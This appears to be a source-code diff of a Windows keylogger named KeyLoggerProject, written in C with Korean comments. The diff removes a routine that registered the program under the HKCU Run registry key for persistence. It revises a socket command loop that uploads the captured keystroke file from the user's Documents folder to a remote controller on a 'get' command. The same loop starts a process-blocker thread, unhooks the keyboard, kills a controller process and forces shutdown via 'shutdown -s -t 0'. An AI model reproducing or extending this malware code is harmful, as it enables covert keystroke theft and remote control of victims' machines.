@@ -15,26 +15,7 @@ void CreateSocket()//소켓생성함수
 }
 
 
-void Register()//레지리스트 등록 함수
-{
-	int ret;
-	HKEY hkey;
-	char data[BUF_SIZE];
-
-	ret = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hkey);//레지리스트 열기 전 시스템에 상시 시작프로그램으로 등록하는 경로임. 
-
-	if (ret == ERROR_SUCCESS)
-	{
-		memset(data, 0, sizeof(data));
-		_getcwd(data, BUF_SIZE);
-		sprintf_s(data, BUF_SIZE, "%s\\%s", data, "KeyLoggerProject.exe");
-		RegSetValueEx(hkey, TEXT("KeyLoggerProject"), 0, REG_SZ, (BYTE*)data, sizeof(data));//레지리스트에 프로그램 등록설정
-	}
-
-	RegCloseKey(hkey);
-}
-
-int killProcess(TCHAR* name)
+int KillProcess(TCHAR* name)
 {
 	HANDLE hProcessSnap;
 	PROCESSENTRY32 pe32;
@@ -73,12 +54,19 @@ int killProcess(TCHAR* name)
 void RecvProc()
 {
 	DWORD numOfByteRead = 0;
-	DWORD dwResult;
+	TCHAR DataFileName[BUF_SIZE] = { 0, };
 	char RecvMessage[BUF_SIZE];
 	char sendmessage[FILE_BUF];
 	int Len;
-	HANDLE pThread;
 	static BOOL isblock = FALSE;
+	TCHAR Username[10];
+	DWORD UserLen;
+	HANDLE pThread;
+		
+
+	GetUserName(Username, &UserLen);
+	wsprintf(DataFileName, TEXT("C:\\Users\\%s\\Documents\\data.txt"), Username);
+
 
 	while (1) {
 
@@ -87,7 +75,7 @@ void RecvProc()
 		if (strncmp(RecvMessage, "get", 3) == 0)//get명령이 전송된경우
 		{
 			//파일전송
-			hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+			hFile = CreateFile(DataFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 			while (1)
 			{
 
@@ -107,7 +95,7 @@ void RecvProc()
 
 			if (!isblock) {
 
-				pThread = (HANDLE)_beginthreadex(NULL, 0, ConnectProc, NULL, 0, 0);
+				pThread = (HANDLE)_beginthreadex(NULL, 0, ProcessBlocker, NULL, 0, 0);
 				isblock = TRUE;
 			}
 
@@ -116,8 +104,11 @@ void RecvProc()
 
 			if (isblock) {
 
-				TerminateThread(pThread, dwResult);
+				TerminateThread(pThread, 0);
+				CloseHandle(pThread);
+				pThread = NULL;
 				isblock = FALSE;
+			
 
 			}
 
@@ -135,12 +126,9 @@ void RecvProc()
 			closesocket(hSocket);
 			Kuninstallhook();
 			FreeLibrary(KhinstDll);
-			TerminateThread(Con_pThread, dwResult);
-			TerminateThread(USB_pThread, dwResult);
-			CloseHandle(Con_pThread);
-			CloseHandle(USB_pThread);
 			WSACleanup();
-			ExitProcess(1);
+			KillProcess(TEXT("Controller.exe"));
+			
 			break;
 
 		}
@@ -150,13 +138,9 @@ void RecvProc()
 			closesocket(hSocket);
 			Kuninstallhook();
 			FreeLibrary(KhinstDll);
-			TerminateThread(Con_pThread, dwResult);
-			TerminateThread(USB_pThread, dwResult);
-			CloseHandle(Con_pThread);
-			CloseHandle(USB_pThread);
 			WSACleanup();
 			system("shutdown -s -t 0");
-			ExitProcess(1);
+			KillProcess(TEXT("Controller.exe"));
 			break;
 		}
 		else if (Len == 0) {//eof전달시
@@ -167,3 +151,4 @@ void RecvProc()
 	}
 
 }
+
